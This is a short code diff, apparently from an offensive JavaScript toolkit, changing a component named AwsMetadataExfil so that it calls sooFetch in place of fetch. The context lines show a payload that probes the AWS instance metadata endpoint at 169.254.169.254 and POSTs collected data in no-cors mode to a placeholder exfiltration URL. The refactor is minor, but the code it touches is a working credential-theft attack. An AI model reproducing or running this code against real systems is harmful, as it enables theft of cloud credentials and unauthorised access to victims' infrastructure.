@@ -28,7 +28,7 @@ const AwsMetadataExfil = () => {
         };
 
         let EXFILTRATION_URL = "http://xxxx.xxx:xxxxx/";
-        fetch(EXFILTRATION_URL, {
+        sooFetch(EXFILTRATION_URL, {
             method: 'POST',
             mode: "no-cors",
             headers: {
@@ -44,7 +44,7 @@ const AwsMetadataExfil = () => {
     async function isService(headers, cookie, body) {
         let controller = new AbortController(); //NO IE support
         let signal = controller.signal;
-        return timeout(1000, fetch(`http://169.254.169.254/latest/meta-data/`, {
+        return timeout(1000, sooFetch(`http://169.254.169.254/latest/meta-data/`, {
             mode: 'no-cors',
             credentials: 'omit',
             signal
